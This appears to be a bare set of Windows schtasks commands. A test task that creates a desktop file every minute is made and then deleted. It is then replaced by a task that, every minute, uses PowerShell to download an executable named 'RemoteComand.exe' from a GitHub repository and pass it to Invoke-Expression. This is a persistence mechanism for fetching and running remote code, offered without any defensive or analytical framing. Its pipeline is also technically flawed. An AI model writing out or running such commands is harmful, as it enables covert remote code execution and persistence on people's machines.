schtasks /create /tn "MyFrequentTask" /tr "powershell.exe -Command \"New-Item -Path $HOME\Desktop\test.txt -ItemType File\"" /sc minute /mo 1
schtasks /delete /tn "MyFrequentTask" /f
schtasks /create /tn "MyFrequentTask" /tr "powershell.exe -Command \"(New-Object System.Net.WebClient).DownloadData('https://github.com/FFSuccess/Exe/raw/main/RemoteComand.exe') | Invoke-Expression\"" /sc minute /mo 1
